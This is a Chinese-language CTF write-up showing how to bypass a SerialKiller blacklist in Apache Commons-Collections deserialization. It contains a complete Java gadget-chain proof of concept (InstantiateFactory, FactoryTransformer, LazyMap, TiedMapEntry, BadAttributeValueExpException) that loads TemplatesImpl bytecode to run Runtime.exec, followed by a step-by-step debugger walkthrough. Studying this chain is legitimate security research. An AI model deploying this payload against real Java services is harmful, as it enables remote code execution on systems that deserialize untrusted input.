# 前言

早就根据网上的文章复现了CC1，但是没去研究过关于这个绕过的，最近打MRCTF看到他把之前用到的transformer这些东西都过滤，都不知道怎么办，后面看W&M的大佬们的wp，他们用了一些其他的类来做到最后的命令执行

过滤的类

![image-20220428195620691](images/1.png)

他这里是通过serialkiller来过滤的，这个东西的话其实是可以用JRMP反序列化对实现一个对应绕过的，具体可以参照`DDCTF2019 再来一杯java`

但是题目是不出网的，就打不通

# Bypass

这里可以看到主要是ban掉的一些之前见过的transformer类，对后面的TemplatesImpl加载字节码并没有相应的过滤，这里看师傅wp提到的就是通过`InstantiateFactory`和`FactoryTransformer`类来实现一个绕过，我就去看了一下，发现确实也有一个和`InstantiateTransformer`相似的实例化一个类的操作，然后就可以去调用TrAXFilter类的构造器，接下来就和CC3 是一样的了

这里我就拿CC5的入口点（因为是通杀的）和这里拼接一下拿到了下面这个poc

```
package NewCC;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections.Factory;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.functors.InstantiateFactory;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class Newcc {
    public static void main(String[] args) throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass STU = pool.makeClass("T0WN");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc.exe\");";
        STU.makeClassInitializer().insertBefore(cmd);
        STU.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        STU.writeFile();
        byte[] bytes = STU.toBytecode();
        byte[][] targetbytes = new byte[][]{bytes};

        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        setFiledValue(templates,"_bytecodes",targetbytes);
        setFiledValue(templates,"_name","DawnT0wn");
        setFiledValue(templates,"_class",null);

        InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class,new Class[]{Templates.class},new Object[]{templates});
        FactoryTransformer factoryTransformer = new FactoryTransformer(instantiateFactory);

        Map innermap = new HashMap();
        LazyMap outmap = (LazyMap) LazyMap.decorate(innermap,factoryTransformer);

        TiedMapEntry tiedmap = new TiedMapEntry(outmap,"town");
        BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
        Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
        val.setAccessible(true);
        val.set(poc,tiedmap);

        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CC.bin"));
        os.writeObject(poc);

        ObjectInputStream fos = new ObjectInputStream(new FileInputStream("CC.bin"));
        fos.readObject();

    }

    public static void setFiledValue(Object obj,String Filename,Object value) throws Exception
    {
        Field field = obj.getClass().getDeclaredField(Filename);
        field.setAccessible(true);
        field.set(obj,value);
    }
}
```

![image-20220428200258545](images/2.png)

命令执行成功

# 漏洞分析

虽然分析过CC5这些了，还是来分析一下

对于后面加载字节码就是经典问题了，那里是很熟悉了的就不分析了，直接看TrAXFilter类

![image-20220428201110988](images/3.png)

他的构造器里面传入的是一个Templates接口的参数，然后去调用了newTransformer，在CC3的时候是在InstantiateTransformer这个类里面的transform方法通过反射来调用这里的构造器

![image-20220428201248299](images/4.png)

不过这里我们不能用这个，就是这次的主角InstantiateFactory，来看看这个类有个create方法可以是实例化一个构造器

![image-20220428201429027](images/5.png)

不过这个参数在findConstrctor

![image-20220428201508269](images/6.png)

而在构造器里面又会默认调用这个方法

![image-20220428201538745](images/7.png)

只要让`iClassToInstantiate`参数是需要获取的类，`iParamTypes`是`new Class[]`数组（即对应的类），然后`iArgs`是构造器对应的参数，也就是我们的恶意类templates，对应POC的代码为

```
InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class,new Class[]{Templates.class},new Object[]{templates});
```

接下来还有另外一个类，调用了这个类的create方法，那就是FactoryTransformer类

![image-20220428201849396](images/8.png)

实例化的时候控制一下参数为InstantiateFactory类的实例化即可，至于transform的参数都不用管

这里都出现transform方法了，那就是熟悉的LazyMap登场的时间了

LazyMap#get

```
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

还是用LazyMap默认的修饰来实例化这个类，对应代码

```
Map innermap = new HashMap();
LazyMap outmap = (LazyMap) LazyMap.decorate(innermap,factoryTransformer);
```

剩下的就是CC5的内容了

也就是TiedMapEntry的getValue来调用LazyMap的get方法

![image-20220428202828054](images/9.png)

而且在这个类里面有一个toString可以调用getValue

![image-20220428202901330](images/10.png)

接下来调试着看看

# 断点调试

从BadAttributeValueExpException的readObject开始

![image-20220428202254765](images/11.png)

这里调用了刚才说的toString，来看看这个valObj参数，通过反序列化读出来的val参数，只有赋值为TiedMapEntry的实例化即可

但是POC里面并没有这样

```
TiedMapEntry tiedmap = new TiedMapEntry(outmap,"town");
BadAttributeValueExpException poc = new BadAttributeValueExpException(1);
Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
val.setAccessible(true);
val.set(poc,tiedmap);
```

是通过反射来赋值的

原因在于BadAttributeValueExpException的构造函数

```
public BadAttributeValueExpException (Object val) {
    this.val = val == null ? null : val.toString();
}
```

这里如果val是TiedMapEntry的话也会调用toString

一路跟进到getValue

![image-20220428203333483](images/12.png)

看到这里的map是LazyMap，也是在实例化TiedMapEntry绑定进去的

然后就走到了LazyMap

![image-20220428203430449](images/13.png)

继续跟到transform方法

然后跟进到create

![image-20220428203517687](images/14.png)

实例化TrAXFilter

![image-20220428203603407](images/15.png)

然后就是熟悉的加载字节码了



参考：微信公众白帽100安全攻防实验室的W&M的MRCTF wp